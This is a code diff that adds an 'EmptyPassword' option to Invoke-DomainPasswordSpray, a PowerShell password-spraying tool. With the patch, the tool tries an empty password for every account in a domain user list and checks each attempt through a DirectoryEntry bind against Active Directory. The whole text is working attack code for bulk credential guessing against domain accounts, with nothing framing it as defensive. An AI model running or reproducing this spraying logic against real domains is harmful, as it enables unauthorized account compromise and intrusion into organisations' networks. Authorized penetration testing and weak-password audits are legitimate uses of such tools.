@@ -53,6 +53,10 @@ function Invoke-DomainPasswordSpray{
     .PARAMETER UsernameAsPassword
 
     For each user, will try that user's name as their password
+    
+    .PARAMETER EmptyPassword
+
+    For each user, will try an empty password
 
     .EXAMPLE
 
@@ -113,17 +117,21 @@ function Invoke-DomainPasswordSpray{
      $UsernameAsPassword,
 
      [Parameter(Position = 8, Mandatory = $false)]
+     [switch]
+     $EmptyPassword,
+
+     [Parameter(Position = 9, Mandatory = $false)]
      [int]
      $Delay=0,
 
-     [Parameter(Position = 9, Mandatory = $false)]
+     [Parameter(Position = 10, Mandatory = $false)]
      $Jitter=0,
 
-     [Parameter(Position = 10, Mandatory = $false)]
+     [Parameter(Position = 11, Mandatory = $false)]
      [switch]
      $Quiet,
 
-     [Parameter(Position = 11, Mandatory = $false)]
+     [Parameter(Position = 12, Mandatory = $false)]
      [int]
      $Fudge=10
     )
@@ -133,6 +141,10 @@ function Invoke-DomainPasswordSpray{
         $Passwords = @($Password)
     }
     elseif($UsernameAsPassword)
+    {
+        $Passwords = ""
+    }
+    elseif($EmptyPassword)
     {
         $Passwords = ""
     }
@@ -229,6 +241,10 @@ function Invoke-DomainPasswordSpray{
     if($UsernameAsPassword)
     {
         Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
+    }
+    elseif($EmptyPassword)
+    {
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -EmptyPassword
     }
     else
     {
@@ -520,7 +536,10 @@ function Invoke-SpraySinglePassword
             [Parameter(Position=7)]
             [switch]
             $UsernameAsPassword,
-            [Parameter(Position=7)]
+            [Parameter(Position=8)]
+            [switch]
+            $EmptyPassword,
+            [Parameter(Position=9)]
             [switch]
             $Quiet
     )
@@ -539,6 +558,10 @@ function Invoke-SpraySinglePassword
         if ($UsernameAsPassword)
         {
             $Password = $User
+        }
+        elseif($EmptyPassword)
+        {
+            $Password = ""
         }
         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
         if ($Domain_check.name -ne $null)
